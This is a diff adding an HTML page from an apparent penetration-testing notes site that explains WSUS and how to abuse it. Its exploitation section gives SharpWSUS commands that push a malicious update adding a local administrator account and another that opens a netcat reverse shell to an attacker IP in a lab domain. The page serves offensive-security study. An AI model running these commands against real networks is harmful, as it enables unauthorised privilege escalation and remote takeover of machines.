@@ -1,0 +1,67 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Maven+Pro:wght@400..900&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="/H4ckV4ult/styles/navBarStyles.css">
+    <link rel="stylesheet" href="/H4ckV4ult/styles/walkthroughs.css">
+        <link href="/H4ckV4ult/styles/prism/prism.css" rel="stylesheet" />
+    <script src="/H4ckV4ult/styles/prism/prism.js"></script>
+    <title>Minimalist Webpage</title>
+
+</head>
+<body>
+    <div id="navbar-container"></div>
+    <script src="/H4ckV4ult/components/navbar.js"></script>
+
+    <div class="notion-container">
+        <div class="notion-header">
+            <h1>WSUS (Windows Server Update Services)  (8530/HTTP, 8531/HTTPS)</h1>
+            <p>WSUS is a Microsoft solution for administrators to deploy Microsoft product updates and patches across an environment in a scalable manner, using a method where the internal servers do not need to reach out to the internet directly. WSUS is extremely common within Windows corporate environments.</p>
+        </div>
+        <div class="notion-body">
+            <h2>Theory</h2>
+            <ul>
+                <p>Typically, the architecture of WSUS deployments is quite simple, although they can be configured in more complex ways. The most common deployment consists of one WSUS server within the corporate network. This server will reach out to Microsoft over HTTP and HTTPS to download Microsoft patches. After downloading these, the WSUS server will deploy the patch to clients as they check in to the WSUS server. Communication between the WSUS server and the clients will occur on port 8530 for HTTP and 8531 for HTTPS. An example of this deployment is below</p>
+                <p>Here goes an image of it:</p>
+                <img style="border: 1px solid;" src="/H4ckV4ult/images/protocolsImages/wsus-arch.png"> 
+                <p>In a more complex deployment of WSUS, there may be one main WSUS server that communicates over the internet to Microsoft, then internally the main WSUS server pushes the patches out to other internal WSUS servers, which then deploy it to clients. In this scenario the WSUS server connecting to the internet would be known as the Upstream Server, and the WSUS servers that do not have internet access and get their patches from the Upstream Server would be Downstream Servers. An example diagram of this is below:</p>
+                <img style="border: 1px solid;" src="/H4ckV4ult/images/protocolsImages/wsus-arch2.png"> 
+            </ul>
+
+
+
+            <h2>Enumeration</h2>
+            <ul>
+                <p>First identify if there is a WSUS server by using the following command</p>
+                <pre><code class="language-powershell">reg query HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate</code></pre>
+                <p>If there is one it will show it in the parameter WUServer</p>
+                <p>We can also check with the following command if the wsus server is active. Check <b>UseWUServer</b> parameter</p>
+                <pre><code class="language-powershell">reg query HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate\AU</code></pre>
+            </ul>   
+            
+            <h2>Exploitation</h2>
+            <ul>
+                <p>In case there is one. We could use <a class="notion-link" href="https://github.com/nettitude/SharpWSUS">SharpWSUS</a> in order to inject a malicious WSUS update which make us escalate our privileges</p>
+                <p>First of all we must say that the malicious package must be download from the client to take effect</p>
+
+                <h3>Lateral movement using psexec.exe</h3>
+                <ul>
+                    <p>Identify where psexec.exe is being stored and use the following command in order to add a new user WSUSDemo to the Administrator group</p>
+                    <pre><code class="language-powershell">SharpWSUS.exe create /payload:"C:\Users\ben\Documents\pk\psexec.exe" /args:"-accepteula -s -d cmd.exe /c \"net user WSUSDemo Password123! /add && net localgroup administrators WSUSDemo /add\"" /title:"WSUSDemo"</code></pre>
+                    <p>We can also perform a netcat connection towards our attacker IP</p>
+                    <pre><code class="language-powershell">SharpWSUS.exe create /payload:"C:\users\sflowers\Desktop\PsExec64.exe" /args:"-accepteula -s -d c:\\users\\sflowers\\desktop\\nc64.exe -e cmd.exe 10.10.14.5 9001" /title:"pwned"</code></pre>
+                    <p>Once you have created the update package we must approve it </p>
+                    <pre><code class="language-powershell">SharpWSUS.exe approve /updateid:1ece2bf6-d412-4099-96e3-8efd46f616c8 /computername:dc.outdated.htb /groupname:"pwned"</code></pre>
+                </ul>
+            </ul>
+            
+        </div>
+    </div>
+
+
+</body>
+</html>
